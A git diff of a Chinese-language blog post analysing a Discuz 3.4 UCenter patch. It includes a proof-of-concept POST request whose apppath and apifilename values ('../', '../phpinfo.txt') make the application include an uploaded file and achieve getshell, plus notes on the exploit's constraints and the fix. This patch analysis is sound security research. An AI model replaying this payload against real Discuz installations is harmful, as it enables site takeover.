@@ -135,9 +135,12 @@ Upgrade-Insecure-Requests: 1
 
 sid=87c1Zk21dOZPwMBkwqz%2BmgKKVA%2FrhGZKGqu1CWAP63EzBMLJWaCtv9K1DPs%2B61zf7vEER6usLasOpQ&formhash=c98254e0423cf9af&type=DISCUZX&name=Discuz%21+Board&url=http%3A%2F%2Flocalhost%2Fdiscuz-3.4%2Fupload&extraurl=&ip=&authkey=SfU517M8n8u1scR1T255Gea6G909L2l338E6seAdP7xei3U0yag9J3gfm6iey66b&apppath=..%2F&viewprourl=&apifilename=../phpinfo.txt&tagtemplates=&tagfields=&synlogin=1&recvnote=1&submit=+%E6%8F%90+%E4%BA%A4+
 ```
-* apppath=..%2F 因为不知道绝对路径，输入../会自动补全
+* apppath=..%2F 如果不知道绝对路径，输入../会自动生成,这里只能填存在的路径且和./api/uc.php拼接文件存在，discuz3.4/upload/uc_server/control/admin/app.php的157行
+* 伪协议也不能用，discuz3.4/upload/uc_server/control/admin/app.php的155行realpath()函数过滤。
 ![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/绝对路径.jpg)
-* apifilename= 可以是任意上传的图片等填入相对路径,这里phpinfo.txt是我创建在web根目录的测试文件
+* apifilename= 可以是上传的图片(不能是经过GB库处理的)、附件等，填入相对路径(discuz
+前台不会返回上传文件路径，必须通过admin后台上传),这里phpinfo.txt是我创建在web根目录的测试文件。
+* 更新的修复代码也很自信，apifilename参数限制了只能为php后缀的文件，我认为修复的不够保险，可以写死为uc.php。
 
 POC的包发完以后，访问登陆页面、ucenter首页等多处都包含了指定的文件，达到getshell的目的。
 ![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/Jietu20180612-191327.jpg)
